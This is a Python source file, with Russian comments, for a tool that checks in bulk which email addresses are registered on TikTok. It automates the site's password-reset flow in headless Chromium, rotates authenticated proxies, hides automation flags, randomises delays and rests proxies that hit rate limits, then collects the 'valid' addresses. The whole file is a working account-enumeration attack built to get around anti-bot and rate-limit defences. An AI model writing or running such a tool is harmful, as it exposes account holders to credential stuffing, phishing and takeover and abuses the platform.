from __future__ import annotations
import asyncio
from typing import List, Optional, Callable, Awaitable
from random import uniform
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError
from datetime import datetime, timedelta

URL_MAIN = "https://www.tiktok.com/"
MAX_CONCURRENCY = 10
REQUEST_TIMEOUT = 30000  # 30 секунд


class ProxyModel:
    def __init__(self, proxy_string: str):
        self.proxy_string = proxy_string
        self.is_cooling_down = False
        self.cooldown_until: Optional[datetime] = None
        self.success_count = 0
        self.error_count = 0

    def needs_cooldown(self, minutes: int = 15):
        self.is_cooling_down = True
        self.cooldown_until = datetime.now() + timedelta(minutes=minutes)

    def is_available(self) -> bool:
        if not self.is_cooling_down:
            return True
        if self.cooldown_until is None or datetime.now() >= self.cooldown_until:
            self.is_cooling_down = False
            self.cooldown_until = None
            return True
        return False


class TikTokChecker:
    def __init__(self, proxies: List[str],
                 log_callback: Callable[[int, str], Awaitable[None]],
                 user_id: int):
        self.emails_queue: asyncio.Queue[str] = asyncio.Queue()
        self.proxy_pool = [ProxyModel(p) for p in proxies]
        self.log_callback = log_callback
        self.valid_emails: List[str] = []
        self.rate_limit_error_text = "слишком много запросов"
        self.semaphore = asyncio.Semaphore(min(MAX_CONCURRENCY, len(proxies)))
        self.user_id = user_id
        self.is_running = True
        self.checked_count = 0
        self.total_emails = 0

    async def _send_log(self, message: str):
        """Отправляет лог через асинхронный callback"""
        try:
            await self.log_callback(self.user_id, message)
        except Exception as e:
            print(f"Ошибка отправки лога: {e}")

    def _get_available_proxy(self) -> Optional[ProxyModel]:
        """Возвращает доступный прокси"""
        for proxy_obj in self.proxy_pool:
            if proxy_obj.is_available():
                return proxy_obj
        return None

    async def _check_single_email(self, email: str, proxy_obj: ProxyModel):
        """Проверяет один email через указанный прокси"""
        if not self.is_running:
            return

        proxy_data = proxy_obj.proxy_string.split('@')
        server = proxy_data[-1]

        proxy_config = {"server": f"http://{server}"}
        if len(proxy_data) > 1:
            user_pass = proxy_data[0].split(':')
            proxy_config["username"] = user_pass[0]
            proxy_config["password"] = user_pass[1]

        browser = None

        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=True,
                    args=["--disable-blink-features=AutomationControlled"]
                )

                context = await browser.new_context(
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    locale="ru-RU",
                    proxy=proxy_config
                )

                page = await context.new_page()

                # Устанавливаем таймауты
                page.set_default_timeout(REQUEST_TIMEOUT)

                await self._send_log(f"→ <code>{email}</code>: проверка через {server}")

                # Переходим на TikTok
                try:
                    await page.goto(URL_MAIN, wait_until="networkidle", timeout=REQUEST_TIMEOUT)
                except PlaywrightTimeoutError:
                    await self._send_log(f"⚠️ <code>{email}</code>: таймаут при загрузке")
                    proxy_obj.error_count += 1
                    proxy_obj.needs_cooldown(minutes=2)
                    return

                await asyncio.sleep(uniform(2, 3))

                # Ищем кнопку входа
                try:
                    await page.click('button:has-text("Войти")')
                except:
                    try:
                        await page.click('[data-e2e="login-button"]')
                    except:
                        await self._send_log(f"⚠️ <code>{email}</code>: не нашел кнопку входа")
                        proxy_obj.error_count += 1
                        proxy_obj.needs_cooldown(minutes=1)
                        return

                await asyncio.sleep(uniform(1, 2))

                # Ищем "Забыли пароль?"
                try:
                    await page.click('text=Забыли пароль?')
                except:
                    try:
                        await page.click('text=Forgot password?')
                    except:
                        await self._send_log(f"⚠️ <code>{email}</code>: не нашел 'Забыли пароль?'")
                        proxy_obj.error_count += 1
                        proxy_obj.needs_cooldown(minutes=1)
                        return

                await asyncio.sleep(uniform(1, 2))

                # Ищем восстановление по email
                try:
                    await page.click('text=Сброс пароля по электронной почте')
                except:
                    try:
                        await page.click('text=Reset password by email')
                    except:
                        await self._send_log(f"⚠️ <code>{email}</code>: не нашел восстановления по email")
                        proxy_obj.error_count += 1
                        proxy_obj.needs_cooldown(minutes=1)
                        return

                await asyncio.sleep(uniform(1, 2))

                # Ввод email
                try:
                    email_input = page.locator('input[name="email"]').first
                    await email_input.fill(email)
                except:
                    try:
                        email_input = page.locator('input[type="email"]').first
                        await email_input.fill(email)
                    except:
                        await self._send_log(f"⚠️ <code>{email}</code>: не нашел поле для email")
                        proxy_obj.error_count += 1
                        proxy_obj.needs_cooldown(minutes=1)
                        return

                await asyncio.sleep(uniform(1, 2))

                # Кнопка отправки
                try:
                    await page.click('button[type="submit"]')
                except:
                    try:
                        await page.click('button:has-text("Отправить")')
                    except:
                        try:
                            await page.click('button:has-text("Send")')
                        except:
                            await self._send_log(f"⚠️ <code>{email}</code>: не нашел кнопку отправки")
                            proxy_obj.error_count += 1
                            proxy_obj.needs_cooldown(minutes=1)
                            return

                # Ожидание результата
                await asyncio.sleep(3)

                # Проверка результата
                content = await page.content()

                # Проверка на ошибки
                if any(error in content.lower() for error in
                       ["слишком много запросов", "too many attempts", "rate limit"]):
                    proxy_obj.needs_cooldown(minutes=15)
                    await self._send_log(f"⚠️ <code>{email}</code>: Rate limit через {server}")
                    proxy_obj.error_count += 1
                    return

                # Проверка на регистрацию
                if any(indicator in content.lower() for indicator in ["не зарегистрирован", "not registered"]):
                    await self._send_log(f"❌ <code>{email}</code>: не зарегистрирован")
                    proxy_obj.success_count += 1
                else:
                    await self._send_log(f"✅ <code>{email}</code>: <b>ВАЛИД!</b>")
                    self.valid_emails.append(email)
                    proxy_obj.success_count += 1

        except Exception as e:
            await self._send_log(f"⚠️ <code>{email}</code>: ошибка ({type(e).__name__})")
            proxy_obj.error_count += 1
            proxy_obj.needs_cooldown(minutes=3)
        finally:
            try:
                if browser:
                    await browser.close()
            except:
                pass

    async def _worker(self):
        """Воркер для обработки email из очереди"""
        while self.is_running:
            try:
                # Используем asyncio.wait_for с таймаутом
                email = await asyncio.wait_for(self.emails_queue.get(), timeout=1.0)

                if email is None:  # Сигнал остановки
                    self.emails_queue.task_done()
                    break

                # Ищем доступный прокси
                proxy_obj = None
                wait_count = 0

                while proxy_obj is None and self.is_running:
                    proxy_obj = self._get_available_proxy()
                    if proxy_obj is None:
                        if wait_count == 0:  # Сообщаем только один раз
                            await self._send_log("⏳ Все прокси заняты. Жду 10 секунд...")
                        await asyncio.sleep(10)
                        wait_count += 1
                        if wait_count > 6:  # Максимум 1 минута ожидания
                            await self._send_log("❌ Нет доступных прокси после долгого ожидания")
                            self.emails_queue.task_done()
                            return

                if proxy_obj and self.is_running:
                    async with self.semaphore:
                        await self._check_single_email(email, proxy_obj)

                self.emails_queue.task_done()
                self.checked_count += 1

                # Отчет о прогрессе каждые 20 проверок
                if self.checked_count % 20 == 0:
                    progress = (self.checked_count / self.total_emails) * 100 if self.total_emails > 0 else 0
                    await self._send_log(f"📊 Прогресс: {self.checked_count}/{self.total_emails} ({progress:.1f}%)")

            except asyncio.TimeoutError:
                continue
            except asyncio.CancelledError:
                break
            except Exception as e:
                print(f"Ошибка в worker: {e}")
                self.emails_queue.task_done()
                continue

    async def run_checker(self, emails: List[str]):
        """Запускает проверку всех email"""
        if not self.proxy_pool:
            await self._send_log("❌ <b>Нет прокси для запуска!</b>")
            return []

        if not emails:
            await self._send_log("❌ <b>Нет email для проверки!</b>")
            return []

        self.total_emails = len(emails)
        self.checked_count = 0

        # Добавляем email в очередь
        for email in emails:
            await self.emails_queue.put(email)

        # Запускаем воркеров
        workers_count = min(len(self.proxy_pool), MAX_CONCURRENCY)
        workers = [asyncio.create_task(self._worker()) for _ in range(workers_count)]

        await self._send_log(f"🚀 <b>Начинаю проверку {len(emails)} почт через {workers_count} потоков</b>")

        try:
            # Ждем завершения очереди
            await self.emails_queue.join()
        except Exception as e:
            print(f"Ошибка ожидания очереди: {e}")

        # Останавливаем воркеров
        self.is_running = False

        # Отправляем сигнал остановки воркерам
        for _ in range(workers_count):
            try:
                self.emails_queue.put_nowait(None)
            except:
                pass

        # Ждем завершения всех воркеров с таймаутом
        try:
            await asyncio.wait_for(asyncio.gather(*workers, return_exceptions=True), timeout=10)
        except asyncio.TimeoutError:
            print("Таймаут при завершении воркеров")

        # Статистика
        await self._send_log(
            f"✅ <b>Проверка завершена!</b>\n"
            f"Проверено: <b>{self.checked_count}</b> из <b>{self.total_emails}</b>\n"
            f"Найдено валидных: <b>{len(self.valid_emails)}</b>"
        )

        return self.valid_emails


# Тестовые данные
TEST_PROXIES = []
TEST_EMAILS = []
